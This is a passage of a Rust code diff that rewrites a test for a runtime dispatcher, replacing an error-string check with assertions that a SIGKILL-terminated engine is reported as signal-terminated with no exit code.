         PreferredRuntime::FrankenEngine,
     );
 
-    // Set short timeout for faster test completion
-    unsafe {
-        std::env::set_var("FRANKEN_ENGINE_TIMEOUT_SECS", "10");
-    }
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "balanced", &[], 0)
+        .expect("subprocess dispatch surfaces signal termination in the report");
 
-    // Clean up env var when test completes
-    struct EnvCleanup(&'static str);
-    impl Drop for EnvCleanup {
-        fn drop(&mut self) {
-            unsafe {
-                std::env::remove_var(self.0);
-            }
-        }
-    }
-    let _cleanup = EnvCleanup("FRANKEN_ENGINE_TIMEOUT_SECS");
-
-    // Execute and expect failure due to signal/crash
-    let result = dispatcher.dispatch_run(&app_path, &config, "test", &[], 0);
-
+    assert_eq!(report.runtime, "franken_engine");
     assert!(
-        result.is_err(),
-        "Should fail when engine crashes/receives signal"
+        report.terminated_by_signal,
+        "SIGKILL termination must be reported as terminated_by_signal"
     );
-
-    let error = result.unwrap_err();
-    let error_str = error.to_string();
-
-    // Verify error indicates abnormal termination
-    assert!(
-        error_str.contains("signal")
-            || error_str.contains("killed")
-            || error_str.contains("terminated")
-            || error_str.contains("crash")
-            || error_str.contains("failed"),
-        "Error should indicate abnormal process termination, got: {}",
-        error_str
+    assert_eq!(
+        report.exit_code, None,
+        "a signal-terminated engine has no exit code"
     );
-
-    // Verify error provides meaningful context (ActionableError integration tested elsewhere)
-    println!("Engine crash error: {}", error_str);
 }
 
 #[test]
